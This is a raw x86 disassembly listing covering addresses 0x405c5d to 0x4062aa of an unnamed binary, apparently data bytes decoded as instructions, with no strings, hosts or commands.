  405c5d:	12 00                	adc    (%eax),%al
  405c5f:	00 01                	add    %al,(%ecx)
  405c61:	00 32                	add    %dh,(%edx)
  405c63:	12 00                	adc    (%eax),%al
  405c65:	00 02                	add    %al,(%edx)
  405c67:	00 39                	add    %bh,(%ecx)
  405c69:	12 00                	adc    (%eax),%al
  405c6b:	00 01                	add    %al,(%ecx)
  405c6d:	00 32                	add    %dh,(%edx)
  405c6f:	12 00                	adc    (%eax),%al
  405c71:	00 02                	add    %al,(%edx)
  405c73:	00 39                	add    %bh,(%ecx)
  405c75:	12 00                	adc    (%eax),%al
  405c77:	00 01                	add    %al,(%ecx)
  405c79:	00 a3 1e 15 00 50    	add    %ah,0x5000151e(%ebx)
  405c7f:	00 39                	add    %bh,(%ecx)
  405c81:	01 49 02             	add    %ecx,0x2(%ecx)
  405c84:	e2 02                	loop   0x405c88
  405c86:	49                   	dec    %ecx
  405c87:	01 49 02             	add    %ecx,0x2(%ecx)
  405c8a:	35 00 51 01 49       	xor    $0x49015100,%eax
  405c8f:	02 37                	add    (%edi),%dh
  405c91:	01 59 01             	add    %ebx,0x1(%ecx)
  405c94:	49                   	dec    %ecx
  405c95:	02 37                	add    (%edi),%dh
  405c97:	01 61 01             	add    %esp,0x1(%ecx)
  405c9a:	49                   	dec    %ecx
  405c9b:	02 37                	add    (%edi),%dh
  405c9d:	01 69 01             	add    %ebp,0x1(%ecx)
  405ca0:	49                   	dec    %ecx
  405ca1:	02 37                	add    (%edi),%dh
  405ca3:	01 71 01             	add    %esi,0x1(%ecx)
  405ca6:	49                   	dec    %ecx
  405ca7:	02 37                	add    (%edi),%dh
  405ca9:	01 79 01             	add    %edi,0x1(%ecx)
  405cac:	49                   	dec    %ecx
  405cad:	02 37                	add    (%edi),%dh
  405caf:	01 81 01 49 02 37    	add    %eax,0x37024901(%ecx)
  405cb5:	01 89 01 49 02 37    	add    %ecx,0x37024901(%ecx)
  405cbb:	01 91 01 49 02 f0    	add    %edx,-0xffdb6ff(%ecx)
  405cc1:	00 99 01 49 02 35    	add    %bl,0x35024901(%ecx)
  405cc7:	00 a1 01 49 02 37    	add    %ah,0x37024901(%ecx)
  405ccd:	01 41 00             	add    %eax,0x0(%ecx)
  405cd0:	49                   	dec    %ecx
  405cd1:	02 ed                	add    %ch,%ch
  405cd3:	02 a9 01 4e 14 f3    	add    -0xcebb1ff(%ecx),%ch
  405cd9:	02 b1 01 64 14 f8    	add    -0x7eb9bff(%ecx),%dh
  405cdf:	02 b9 01 72 14 3c    	add    0x3c147201(%ecx),%bh
  405ce5:	00 09                	add    %cl,(%ecx)
  405ce7:	00 77 14             	add    %dh,0x14(%edi)
  405cea:	33 01                	xor    (%ecx),%eax
  405cec:	09 00                	or     %eax,(%eax)
  405cee:	49                   	dec    %ecx
  405cef:	02 35 00 c1 01 49    	add    0x4901c100,%dh
  405cf5:	02 14 03             	add    (%ebx,%eax,1),%dl
  405cf8:	d1 01                	roll   $1,(%ecx)
  405cfa:	49                   	dec    %ecx
  405cfb:	02 35 00 a9 01 b0    	add    0xb001a900,%dh
  405d01:	14 3f                	adc    $0x3f,%al
  405d03:	00 61 00             	add    %ah,0x0(%ecx)
  405d06:	49                   	dec    %ecx
  405d07:	02 1b                	add    (%ebx),%bl
  405d09:	03 69 00             	add    0x0(%ecx),%ebp
  405d0c:	49                   	dec    %ecx
  405d0d:	02 1b                	add    (%ebx),%bl
  405d0f:	03 29                	add    (%ecx),%ebp
  405d11:	00 b6 14 35 00 29    	add    %dh,0x29003514(%esi)
  405d17:	00 49 02             	add    %cl,0x2(%ecx)
  405d1a:	35 00 29 00 bc       	xor    $0xbc002900,%eax
  405d1f:	14 21                	adc    $0x21,%al
  405d21:	03 29                	add    (%ecx),%ebp
  405d23:	00 c8                	add    %cl,%al
  405d25:	14 cf                	adc    $0xcf,%al
  405d27:	02 d9                	add    %cl,%bl
  405d29:	01 e2                	add    %esp,%edx
  405d2b:	14 cf                	adc    $0xcf,%al
  405d2d:	02 79 00             	add    0x0(%ecx),%bh
  405d30:	ee                   	out    %al,(%dx)
  405d31:	14 ec                	adc    $0xec,%al
  405d33:	00 79 00             	add    %bh,0x0(%ecx)
  405d36:	f9                   	stc
  405d37:	14 ec                	adc    $0xec,%al
  405d39:	00 79 00             	add    %bh,0x0(%ecx)
  405d3c:	01 15 ec 00 79 00    	add    %edx,0x7900ec
  405d42:	0b 15 ec 00 0c 00    	or     0xc00ec,%edx
  405d48:	49                   	dec    %ecx
  405d49:	02 1b                	add    (%ebx),%bl
  405d4b:	03 0c 00             	add    (%eax,%eax,1),%ecx
  405d4e:	14 15                	adc    $0x15,%al
  405d50:	2f                   	das
  405d51:	03 71 00             	add    0x0(%ecx),%esi
  405d54:	49                   	dec    %ecx
  405d55:	02 37                	add    (%edi),%dh
  405d57:	03 69 00             	add    0x0(%ecx),%ebp
  405d5a:	2b 15 f0 00 69 00    	sub    0x6900f0,%edx
  405d60:	31 15 f0 00 61 00    	xor    %edx,0x6100f0
  405d66:	37                   	aaa
  405d67:	15 f0 00 61 00       	adc    $0x6100f0,%eax
  405d6c:	42                   	inc    %edx
  405d6d:	15 f0 00 e9 01       	adc    $0x1e900f0,%eax
  405d72:	56                   	push   %esi
  405d73:	15 5a 03 e9 01       	adc    $0x1e9035a,%eax
  405d78:	68 15 33 01 21       	push   $0x21013315
  405d7d:	00 49 02             	add    %cl,0x2(%ecx)
  405d80:	35 00 f1 01 49       	xor    $0x4901f100,%eax
  405d85:	02 60 03             	add    0x3(%eax),%ah
  405d88:	f9                   	stc
  405d89:	01 9b 15 66 03 f9    	add    %ebx,-0x6fc99eb(%ebx)
  405d8f:	01 c1                	add    %eax,%ecx
  405d91:	15 6d 03 e1 00       	adc    $0xe1036d,%eax
  405d96:	49                   	dec    %ecx
  405d97:	02 35 00 09 02 49    	add    0x49020900,%dh
  405d9d:	02 35 00 11 02 49    	add    0x49021100,%dh
  405da3:	02 35 00 d9 01 e2    	add    0xe201d900,%dh
  405da9:	15 37 01 19 02       	adc    $0x2190137,%eax
  405dae:	49                   	dec    %ecx
  405daf:	02 1b                	add    (%ebx),%bl
  405db1:	03 d9                	add    %ecx,%ebx
  405db3:	01 f1                	add    %esi,%ecx
  405db5:	15 74 03 21 02       	adc    $0x2210374,%eax
  405dba:	05 16 7b 03 21       	add    $0x21037b16,%eax
  405dbf:	02 11                	add    (%ecx),%dl
  405dc1:	16                   	push   %ss
  405dc2:	84 03                	test   %al,(%ebx)
  405dc4:	29 02                	sub    %eax,(%edx)
  405dc6:	1c 16                	sbb    $0x16,%al
  405dc8:	ec                   	in     (%dx),%al
  405dc9:	00 31                	add    %dh,(%ecx)
  405dcb:	02 49 02             	add    0x2(%ecx),%cl
  405dce:	1b 03                	sbb    (%ebx),%eax
  405dd0:	d9 01                	flds   (%ecx)
  405dd2:	26 16                	es push %ss
  405dd4:	8a 03                	mov    (%ebx),%al
  405dd6:	d9 01                	flds   (%ecx)
  405dd8:	36 16                	ss push %ss
  405dda:	cf                   	iret
  405ddb:	02 d9                	add    %cl,%bl
  405ddd:	01 55 16             	add    %edx,0x16(%ebp)
  405de0:	91                   	xchg   %eax,%ecx
  405de1:	03 39                	add    (%ecx),%edi
  405de3:	02 62 16             	add    0x16(%edx),%ah
  405de6:	97                   	xchg   %eax,%edi
  405de7:	03 09                	add    (%ecx),%ecx
  405de9:	02 66 16             	add    0x16(%esi),%ah
  405dec:	cf                   	iret
  405ded:	02 d9                	add    %cl,%bl
  405def:	01 ee                	add    %ebp,%esi
  405df1:	14 ec                	adc    $0xec,%al
  405df3:	00 d9                	add    %bl,%cl
  405df5:	01 01                	add    %eax,(%ecx)
  405df7:	15 ec 00 d9 01       	adc    $0x1d900ec,%eax
  405dfc:	80 16 9e             	adcb   $0x9e,(%esi)
  405dff:	03 b1 01 8a 16 a6    	add    -0x59e975ff(%ecx),%esi
  405e05:	03 11                	add    (%ecx),%edx
  405e07:	02 99 16 ab 03 41    	add    0x4103ab16(%ecx),%bl
  405e0d:	02 af 16 b1 03 29    	add    0x2903b116(%edi),%ch
  405e13:	00 b3 16 8a 03 39    	add    %dh,0x39038a16(%ebx)
  405e19:	02 c2                	add    %dl,%al
  405e1b:	16                   	push   %ss
  405e1c:	b7 03                	mov    $0x3,%bh
  405e1e:	29 00                	sub    %eax,(%eax)
  405e20:	db 16                	fistl  (%esi)
  405e22:	bf 03 29 00 01       	mov    $0x1002903,%edi
  405e27:	17                   	pop    %ss
  405e28:	c6 03 59             	movb   $0x59,(%ebx)
  405e2b:	02 1c 17             	add    (%edi,%edx,1),%bl
  405e2e:	cd 03                	int    $0x3
  405e30:	59                   	pop    %ecx
  405e31:	02 31                	add    (%ecx),%dh
  405e33:	17                   	pop    %ss
  405e34:	33 01                	xor    (%ecx),%eax
  405e36:	61                   	popa
  405e37:	02 43 17             	add    0x17(%ebx),%al
  405e3a:	d3 03                	roll   %cl,(%ebx)
  405e3c:	29 00                	sub    %eax,(%eax)
  405e3e:	59                   	pop    %ecx
  405e3f:	17                   	pop    %ss
  405e40:	da 03                	fiaddl (%ebx)
  405e42:	29 00                	sub    %eax,(%eax)
  405e44:	62 17                	bound  %edx,(%edi)
  405e46:	cf                   	iret
  405e47:	02 29                	add    (%ecx),%ch
  405e49:	00 72 17             	add    %dh,0x17(%edx)
  405e4c:	cf                   	iret
  405e4d:	02 29                	add    (%ecx),%ch
  405e4f:	00 91 17 e1 03 29    	add    %dl,0x2903e117(%ecx)
  405e55:	00 a2 17 e1 03 29    	add    %ah,0x2903e117(%edx)
  405e5b:	00 b3 17 e8 03 d9    	add    %dh,-0x26fc17e9(%ebx)
  405e61:	01 be 17 33 01 14    	add    %edi,0x14013317(%esi)
  405e67:	00 c7                	add    %al,%bh
  405e69:	17                   	pop    %ss
  405e6a:	ec                   	in     (%dx),%al
  405e6b:	00 79 02             	add    %bh,0x2(%ecx)
  405e6e:	49                   	dec    %ecx
  405e6f:	02 35 00 14 00 f3    	add    0xf3001400,%dh
  405e75:	17                   	pop    %ss
  405e76:	0f 04                	(bad)
  405e78:	1c 00                	sbb    $0x0,%al
  405e7a:	01 18                	add    %ebx,(%eax)
  405e7c:	21 04 71             	and    %eax,(%ecx,%esi,2)
  405e7f:	02 49 02             	add    0x2(%ecx),%cl
  405e82:	35 00 a1 00 0d       	xor    $0xd00a100,%eax
  405e87:	18 33                	sbb    %dh,(%ebx)
  405e89:	01 71 02             	add    %esi,0x2(%ecx)
  405e8c:	17                   	pop    %ss
  405e8d:	18 cf                	sbb    %cl,%bh
  405e8f:	02 d9                	add    %cl,%bl
  405e91:	01 1c 16             	add    %ebx,(%esi,%edx,1)
  405e94:	ec                   	in     (%dx),%al
  405e95:	00 d9                	add    %bl,%cl
  405e97:	01 23                	add    %esp,(%ebx)
  405e99:	18 ec                	sbb    %ch,%ah
  405e9b:	00 d9                	add    %bl,%cl
  405e9d:	01 37                	add    %esi,(%edi)
  405e9f:	15 f0 00 d9 01       	adc    $0x1d900f0,%eax
  405ea4:	42                   	inc    %edx
  405ea5:	15 f0 00 a1 00       	adc    $0xa100f0,%eax
  405eaa:	2e 18 33             	sbb    %dh,%cs:(%ebx)
  405ead:	01 79 02             	add    %edi,0x2(%ecx)
  405eb0:	3e 18 26             	sbb    %ah,%ds:(%esi)
  405eb3:	04 89                	add    $0x89,%al
  405eb5:	02 68 18             	add    0x18(%eax),%ch
  405eb8:	06                   	push   %es
  405eb9:	01 91 02 7d 18 35    	add    %edx,0x35187d02(%ecx)
  405ebf:	00 79 02             	add    %bh,0x2(%ecx)
  405ec2:	85 18                	test   %ebx,(%eax)
  405ec4:	cf                   	iret
  405ec5:	02 71 02             	add    0x2(%ecx),%dh
  405ec8:	94                   	xchg   %eax,%esp
  405ec9:	18 06                	sbb    %al,(%esi)
  405ecb:	01 41 00             	add    %eax,0x0(%ecx)
  405ece:	49                   	dec    %ecx
  405ecf:	02 f0                	add    %al,%dh
  405ed1:	00 a1 02 49 02 65    	add    %ah,0x65024902(%ecx)
  405ed7:	04 d9                	add    $0xd9,%al
  405ed9:	01 b5 18 6b 04 d9    	add    %esi,-0x26fb94e8(%ebp)
  405edf:	01 c1                	add    %eax,%ecx
  405ee1:	18 6b 04             	sbb    %ch,0x4(%ebx)
  405ee4:	b1 00                	mov    $0x0,%cl
  405ee6:	cb                   	lret
  405ee7:	18 ec                	sbb    %ch,%ah
  405ee9:	00 81 00 d8 18 f0    	add    %al,-0xfe72800(%ecx)
  405eef:	00 b1 00 eb 18 72    	add    %dh,0x7218eb00(%ecx)
  405ef5:	04 b1                	add    $0xb1,%al
  405ef7:	00 f7                	add    %dh,%bh
  405ef9:	18 06                	sbb    %al,(%esi)
  405efb:	01 b1 00 01 19 06    	add    %esi,0x6190100(%ecx)
  405f01:	01 b1 00 09 19 06    	add    %esi,0x6190900(%ecx)
  405f07:	01 a9 01 15 19 77    	add    %ebp,0x77191501(%ecx)
  405f0d:	04 81                	add    $0x81,%al
  405f0f:	00 1f                	add    %bl,(%edi)
  405f11:	19 7c 04 81          	sbb    %edi,-0x7f(%esp,%eax,1)
  405f15:	00 2d 19 cf 02 81    	add    %ch,0x8102cf19
  405f1b:	00 4a 19             	add    %cl,0x19(%edx)
  405f1e:	81 04 81 00 5e 19 88 	addl   $0x88195e00,(%ecx,%eax,4)
  405f25:	04 b1                	add    $0xb1,%al
  405f27:	00 72 19             	add    %dh,0x19(%edx)
  405f2a:	72 04                	jb     0x405f30
  405f2c:	c9                   	leave
  405f2d:	00 80 19 8e 04 c9    	add    %al,-0x36fb71e7(%eax)
  405f33:	00 8a 19 8e 04 c9    	add    %cl,-0x36fb71e7(%edx)
  405f39:	00 93 19 8e 04 b1    	add    %dl,-0x4efb71e7(%ebx)
  405f3f:	02 ac 19 93 04 c9 00 	add    0xc90493(%ecx,%ebx,1),%ch
  405f46:	b5 19                	mov    $0x19,%ch
  405f48:	8e 04 c9             	mov    (%ecx,%ecx,8),%es
  405f4b:	00 c1                	add    %al,%cl
  405f4d:	19 8e 04 c9 00 c9    	sbb    %ecx,-0x36ff36fc(%esi)
  405f53:	19 8e 04 c9 00 d3    	sbb    %ecx,-0x2cff36fc(%esi)
  405f59:	19 8e 04 d9 01 de    	sbb    %ecx,-0x21fe26fc(%esi)
  405f5f:	19 35 00 b9 02 fe    	sbb    %esi,0xfe02b900
  405f65:	19 cf                	sbb    %ecx,%edi
  405f67:	02 d9                	add    %cl,%bl
  405f69:	01 0d 1a 9e 04 29    	add    %ecx,0x29049e1a
  405f6f:	00 1b                	add    %bl,(%ebx)
  405f71:	1a cf                	sbb    %bh,%cl
  405f73:	02 d9                	add    %cl,%bl
  405f75:	01 2a                	add    %ebp,(%edx)
  405f77:	1a 35 00 c1 02 49    	sbb    0x4902c100,%dh
  405f7d:	02 65 04             	add    0x4(%ebp),%ah
  405f80:	b9 00 4b 1a a4       	mov    $0xa41a4b00,%ecx
  405f85:	04 b9                	add    $0xb9,%al
  405f87:	00 57 1a             	add    %dl,0x1a(%edi)
  405f8a:	21 03                	and    %eax,(%ebx)
  405f8c:	b9 00 64 1a cf       	mov    $0xcf1a6400,%ecx
  405f91:	02 b9 00 72 1a 35    	add    0x351a7200(%ecx),%bh
  405f97:	00 24 00             	add    %ah,(%eax,%eax,1)
  405f9a:	78 1a                	js     0x405fb6
  405f9c:	b2 04                	mov    $0x4,%dl
  405f9e:	e9 00 81 1a f0       	jmp    0xf05ae0a3
  405fa3:	00 d9                	add    %bl,%cl
  405fa5:	01 8b 1a 35 00 d9    	add    %ecx,-0x26ffcae6(%ebx)
  405fab:	01 93 1a f0 00 d9    	add    %edx,-0x26ff0fe6(%ebx)
  405fb1:	01 9c 1a f0 00 d9 01 	add    %ebx,0x1d900f0(%edx,%ebx,1)
  405fb8:	a9 1a b8 04 c9       	test   $0xc904b81a,%eax
  405fbd:	02 49 02             	add    0x2(%ecx),%cl
  405fc0:	be 04 d9 01 bc       	mov    $0xbc01d904,%esi
  405fc5:	1a c8                	sbb    %al,%cl
  405fc7:	04 e9                	add    $0xe9,%al
  405fc9:	00 49 02             	add    %cl,0x2(%ecx)
  405fcc:	35 00 e9 00 d6       	xor    $0xd600e900,%eax
  405fd1:	1a cf                	sbb    %bh,%cl
  405fd3:	04 d9                	add    $0xd9,%al
  405fd5:	01 e0                	add    %esp,%eax
  405fd7:	1a 9e 04 d9 01 ee    	sbb    -0x11fe26fc(%esi),%bl
  405fdd:	1a 8a 03 24 00 c7    	sbb    -0x38ffdbfd(%edx),%cl
  405fe3:	17                   	pop    %ss
  405fe4:	ec                   	in     (%dx),%al
  405fe5:	00 b9 00 49 02 35    	add    %bh,0x35024900(%ecx)
  405feb:	00 24 00             	add    %ah,(%eax,%eax,1)
  405fee:	49                   	dec    %ecx
  405fef:	02 35 00 d9 00 f7    	add    0xf700d900,%dh
  405ff5:	1a ec                	sbb    %ah,%ch
  405ff7:	00 d9                	add    %bl,%cl
  405ff9:	00 19                	add    %bl,(%ecx)
  405ffb:	1b d6                	sbb    %esi,%edx
  405ffd:	04 39                	add    $0x39,%al
  405fff:	02 28                	add    (%eax),%ch
  406001:	1b 97 03 e9 02 7d    	sbb    0x7d02e903(%edi),%edx
  406007:	18 35 00 24 00 4f    	sbb    %dh,0x4f002400
  40600d:	1b f0                	sbb    %eax,%esi
  40600f:	00 b9 00 58 1b 35    	add    %bh,0x351b5800(%ecx)
  406015:	00 29                	add    %ch,(%ecx)
  406017:	02 23                	add    (%ebx),%ah
  406019:	18 ec                	sbb    %ch,%ah
  40601b:	00 29                	add    %ch,(%ecx)
  40601d:	00 f1                	add    %dh,%cl
  40601f:	15 74 03 d9 00       	adc    $0xd90374,%eax
  406024:	5d                   	pop    %ebp
  406025:	1b ec                	sbb    %esp,%ebp
  406027:	00 24 00             	add    %ah,(%eax,%eax,1)
  40602a:	62 16                	bound  %edx,(%esi)
  40602c:	dc 04 24             	faddl  (%esp)
  40602f:	00 72 1b             	add    %dh,0x1b(%edx)
  406032:	e2 04                	loop   0x406038
  406034:	d9 00                	flds   (%eax)
  406036:	79 1b                	jns    0x406053
  406038:	33 01                	xor    (%ecx),%eax
  40603a:	d9 00                	flds   (%eax)
  40603c:	86 1b                	xchg   %bl,(%ebx)
  40603e:	33 01                	xor    (%ecx),%eax
  406040:	d9 00                	flds   (%eax)
  406042:	9c                   	pushf
  406043:	1b ec                	sbb    %esp,%ebp
  406045:	00 d9                	add    %bl,%cl
  406047:	00 b0 1b ec 00 f1    	add    %dh,-0xeff13e5(%eax)
  40604d:	02 49 02             	add    0x2(%ecx),%cl
  406050:	e9 04 f1 02 ce       	jmp    0xce435159
  406055:	1b f0                	sbb    %eax,%esi
  406057:	04 f1                	add    $0xf1,%al
  406059:	02 e3                	add    %bl,%ah
  40605b:	1b ec                	sbb    %esp,%ebp
  40605d:	00 f1                	add    %dh,%cl
  40605f:	02 ef                	add    %bh,%ch
  406061:	1b ec                	sbb    %esp,%ebp
  406063:	00 a9 01 fb 1b f4    	add    %ch,-0xbe404ff(%ecx)
  406069:	04 a9                	add    $0xa9,%al
  40606b:	01 02                	add    %eax,(%edx)
  40606d:	1c fc                	sbb    $0xfc,%al
  40606f:	04 d9                	add    $0xd9,%al
  406071:	00 09                	add    %cl,(%ecx)
  406073:	1c 33                	sbb    $0x33,%al
  406075:	01 01                	add    %eax,(%ecx)
  406077:	03 2a                	add    (%edx),%ebp
  406079:	1c 02                	sbb    $0x2,%al
  40607b:	05 31 00 49 02       	add    $0x2490031,%eax
  406080:	35 00 09 03 5d       	xor    $0x5d030900,%eax
  406085:	07                   	pop    %es
  406086:	3a 05 2c 00 49 02    	cmp    0x249002c,%al
  40608c:	35 00 34 00 f3       	xor    $0xf3003400,%eax
  406091:	17                   	pop    %ss
  406092:	0f 04                	(bad)
  406094:	3c 00                	cmp    $0x0,%al
  406096:	01 18                	add    %ebx,(%eax)
  406098:	21 04 01             	and    %eax,(%ecx,%eax,1)
  40609b:	01 4b 1c             	add    %ecx,0x1c(%ebx)
  40609e:	33 01                	xor    (%ecx),%eax
  4060a0:	11 03                	adc    %eax,(%ebx)
  4060a2:	80 1c 5a 05          	sbbb   $0x5,(%edx,%ebx,2)
  4060a6:	11 03                	adc    %eax,(%ebx)
  4060a8:	92                   	xchg   %eax,%edx
  4060a9:	1c 63                	sbb    $0x63,%al
  4060ab:	05 11 03 9a 1c       	add    $0x1c9a0311,%eax
  4060b0:	06                   	push   %es
  4060b1:	01 11                	add    %edx,(%ecx)
  4060b3:	03 a6 1c 6a 05 21    	add    0x21056a1c(%esi),%esp
  4060b9:	03 77 14             	add    0x14(%edi),%esi
  4060bc:	33 01                	xor    (%ecx),%eax
  4060be:	a9 01 02 1c 70       	test   $0x701c0201,%eax
  4060c3:	05 11 03 ba 1c       	add    $0x1cba0311,%eax
  4060c8:	77 05                	ja     0x4060cf
  4060ca:	11 03                	adc    %eax,(%ebx)
  4060cc:	ca 1c 81             	lret   $0x811c
  4060cf:	05 11 03 0b 1d       	add    $0x1d0b0311,%eax
  4060d4:	87 05 29 03 1a 1d    	xchg   %eax,0x1d1a0329
  4060da:	9b                   	fwait
  4060db:	05 01 01 0e 0d       	add    $0xd0e0101,%eax
  4060e0:	33 01                	xor    (%ecx),%eax
  4060e2:	a9 01 fb 1b a1       	test   $0xa11bfb01,%eax
  4060e7:	05 31 00 a5 0b       	add    $0xba50031,%eax
  4060ec:	33 01                	xor    (%ecx),%eax
  4060ee:	49                   	dec    %ecx
  4060ef:	03 29                	add    (%ecx),%ebp
  4060f1:	1d a8 05 11 03       	sbb    $0x31105a8,%eax
  4060f6:	34 1d                	xor    $0x1d,%al
  4060f8:	b0 05                	mov    $0x5,%al
  4060fa:	f9                   	stc
  4060fb:	00 49 02             	add    %cl,0x2(%ecx)
  4060fe:	be 05 2c 00 62       	mov    $0x62002c05,%esi
  406103:	16                   	push   %ss
  406104:	c3                   	ret
  406105:	05 11 03 47 1d       	add    $0x1d470311,%eax
  40610a:	cb                   	lret
  40610b:	05 a9 01 fb 1b       	add    $0x1bfb01a9,%eax
  406110:	d5 05                	aad    $0x5
  406112:	01 01                	add    %eax,(%ecx)
  406114:	2e 18 33             	sbb    %dh,%cs:(%ebx)
  406117:	01 a9 01 55 1d db    	add    %ebp,-0x24e2aaff(%ecx)
  40611d:	05 31 00 12 0c       	add    $0xc120031,%eax
  406122:	37                   	aaa
  406123:	01 01                	add    %eax,(%ecx)
  406125:	01 61 1d             	add    %esp,0x1d(%ecx)
  406128:	8d 02                	lea    (%edx),%eax
  40612a:	31 00                	xor    %eax,(%eax)
  40612c:	ee                   	out    %al,(%dx)
  40612d:	0b 37                	or     (%edi),%esi
  40612f:	01 31                	add    %esi,(%ecx)
  406131:	00 71 0b             	add    %dh,0xb(%ecx)
  406134:	45                   	inc    %ebp
  406135:	02 31                	add    (%ecx),%dh
  406137:	00 d7                	add    %dl,%bh
  406139:	0b 54 02 11          	or     0x11(%edx,%eax,1),%edx
  40613d:	01 49 02             	add    %ecx,0x2(%ecx)
  406140:	35 00 a9 01 7c       	xor    $0x7c01a900,%eax
  406145:	1d 24 06 11 01       	sbb    $0x1110624,%eax
  40614a:	88 1d 7c 04 09 01    	mov    %bl,0x109047c
  406150:	49                   	dec    %ecx
  406151:	02 29                	add    (%ecx),%ch
  406153:	06                   	push   %es
  406154:	61                   	popa
  406155:	03 14 06             	add    (%esi,%eax,1),%edx
  406158:	41                   	inc    %ecx
  406159:	06                   	push   %es
  40615a:	69 03 b5 1d 48 06    	imul   $0x6481db5,(%ebx),%eax
  406160:	61                   	popa
  406161:	03 12                	add    (%edx),%edx
  406163:	0c 02                	or     $0x2,%al
  406165:	05 11 01 bd 1d       	add    $0x1dbd0111,%eax
  40616a:	ec                   	in     (%dx),%al
  40616b:	00 11                	add    %dl,(%ecx)
  40616d:	01 4f 1b             	add    %ecx,0x1b(%edi)
  406170:	f0 00 61 03          	lock add %ah,0x3(%ecx)
  406174:	ee                   	out    %al,(%dx)
  406175:	0b 4e 06             	or     0x6(%esi),%ecx
  406178:	69 03 c8 1d 53 06    	imul   $0x6531dc8,(%ebx),%eax
  40617e:	a9 01 bd 1d ec       	test   $0xec1dbd01,%eax
  406183:	00 d9                	add    %bl,%cl
  406185:	01 5d 07             	add    %ebx,0x7(%ebp)
  406188:	35 00 79 03 ec       	xor    $0xec037900,%eax
  40618d:	1d 6a 06 79 03       	sbb    $0x379066a,%eax
  406192:	d7                   	xlat   %ds:(%ebx)
  406193:	0c 96                	or     $0x96,%al
  406195:	02 79 03             	add    0x3(%ecx),%bh
  406198:	ea 0c 96 02 21 01 fe 	ljmp   $0xfe01,$0x2102960c
  40619f:	1d 70 06 39 00       	sbb    $0x390670,%eax
  4061a4:	49                   	dec    %ecx
  4061a5:	02 35 00 f9 00 06    	add    0x600f900,%dh
  4061ab:	1e                   	push   %ds
  4061ac:	76 06                	jbe    0x4061b4
  4061ae:	29 01                	sub    %eax,(%ecx)
  4061b0:	49                   	dec    %ecx
  4061b1:	02 9e 03 81 03 49    	add    0x49038103(%esi),%bl
  4061b7:	02 37                	add    (%edi),%dh
  4061b9:	01 89 03 49 02 35    	add    %ecx,0x35024903(%ecx)
  4061bf:	00 99 03 c5 1e ec    	add    %bl,-0x13e13afd(%ecx)
  4061c5:	00 44 00 78          	add    %al,0x78(%eax,%eax,1)
  4061c9:	1a b2 04 b1 03 cf    	sbb    -0x30fc4efc(%edx),%dh
  4061cf:	1e                   	push   %ds
  4061d0:	9e                   	sahf
  4061d1:	06                   	push   %es
  4061d2:	59                   	pop    %ecx
  4061d3:	03 dd                	add    %ebp,%ebx
  4061d5:	1e                   	push   %ds
  4061d6:	33 01                	xor    (%ecx),%eax
  4061d8:	31 00                	xor    %eax,(%eax)
  4061da:	03 0c 37             	add    (%edi,%esi,1),%ecx
  4061dd:	01 4c 00 78          	add    %ecx,0x78(%eax,%eax,1)
  4061e1:	1a b2 04 a1 03 e9    	sbb    -0x16fc5efc(%edx),%dh
  4061e7:	1e                   	push   %ds
  4061e8:	06                   	push   %es
  4061e9:	01 b9 03 09 1f 06    	add    %edi,0x61f0903(%ecx)
  4061ef:	01 01                	add    %eax,(%ecx)
  4061f1:	03 0d 1f 02 05 91    	add    0x9105021f,%ecx
  4061f7:	03 49 02             	add    0x2(%ecx),%ecx
  4061fa:	cf                   	iret
  4061fb:	02 c1                	add    %cl,%al
  4061fd:	03 49 02             	add    0x2(%ecx),%ecx
  406200:	65 04 e9             	gs add $0xe9,%al
  406203:	01 3f                	add    %edi,(%edi)
  406205:	1f                   	pop    %ds
  406206:	ac                   	lods   %ds:(%esi),%al
  406207:	06                   	push   %es
  406208:	c9                   	leave
  406209:	03 96 1f b3 06 d1    	add    -0x2ef94ce1(%esi),%edx
  40620f:	03 b4 1f bb 06 d1 03 	add    0x3d106bb(%edi,%ebx,1),%esi
  406216:	c7                   	(bad)
  406217:	1f                   	pop    %ds
  406218:	35 00 e1 03 d7       	xor    $0xd703e100,%eax
  40621d:	1f                   	pop    %ds
  40621e:	c2 06 e1             	ret    $0xe106
  406221:	03 de                	add    %esi,%ebx
  406223:	1f                   	pop    %ds
  406224:	c8 06 e1 03          	enter  $0xe106,$0x3
  406228:	f9                   	stc
  406229:	1f                   	pop    %ds
  40622a:	cf                   	iret
  40622b:	06                   	push   %es
  40622c:	e9 03 05 20 d5       	jmp    0xd5606734
  406231:	06                   	push   %es
  406232:	54                   	push   %esp
  406233:	00 49 02             	add    %cl,0x2(%ecx)
  406236:	65 04 44             	gs add $0x44,%al
  406239:	00 1e                	add    %bl,(%esi)
  40623b:	20 e9                	and    %ch,%cl
  40623d:	06                   	push   %es
  40623e:	5c                   	pop    %esp
  40623f:	00 49 02             	add    %cl,0x2(%ecx)
  406242:	35 00 5c 00 62       	xor    $0x62005c00,%eax
  406247:	16                   	push   %ss
  406248:	dc 04 61             	faddl  (%ecx,%eiz,2)
  40624b:	03 a5 0b fc 06 5c    	add    0x5c06fc0b(%ebp),%esp
  406251:	00 2c 20             	add    %ch,(%eax,%eiz,1)
  406254:	35 00 4c 00 49       	xor    $0x49004c00,%eax
  406259:	02 35 00 4c 00 1e    	add    0x1e004c00,%dh
  40625f:	20 e9                	and    %ch,%cl
  406261:	06                   	push   %es
  406262:	a9 01 35 20 00       	test   $0x203501,%eax
  406267:	07                   	pop    %es
  406268:	a9 01 4e 20 07       	test   $0x7204e01,%eax
  40626d:	07                   	pop    %es
  40626e:	a9 01 6c 20 0f       	test   $0xf206c01,%eax
  406273:	07                   	pop    %es
  406274:	09 03                	or     %eax,(%ebx)
  406276:	5d                   	pop    %ebp
  406277:	07                   	pop    %es
  406278:	1a 07                	sbb    (%edi),%al
  40627a:	a9 01 93 20 27       	test   $0x27209301,%eax
  40627f:	07                   	pop    %es
  406280:	19 04 b4             	sbb    %eax,(%esp,%esi,4)
  406283:	20 eb                	and    %ch,%bl
  406285:	01 59 02             	add    %ebx,0x2(%ecx)
  406288:	cc                   	int3
  406289:	20 2d 07 29 04 ef    	and    %ch,0xef042907
  40628f:	20 34 07             	and    %dh,(%edi,%eax,1)
  406292:	31 04 49             	xor    %eax,(%ecx,%ecx,2)
  406295:	02 3a                	add    (%edx),%bh
  406297:	07                   	pop    %es
  406298:	39 04 10             	cmp    %eax,(%eax,%edx,1)
  40629b:	21 33                	and    %esi,(%ebx)
  40629d:	01 41 04             	add    %eax,0x4(%ecx)
  4062a0:	1f                   	pop    %ds
  4062a1:	21 44 07 e1          	and    %eax,-0x1f(%edi,%eax,1)
  4062a5:	03 2c 21             	add    (%ecx,%eiz,1),%ebp
  4062a8:	4a                   	dec    %edx
  4062a9:	07                   	pop    %es
  4062aa:	49                   	dec    %ecx
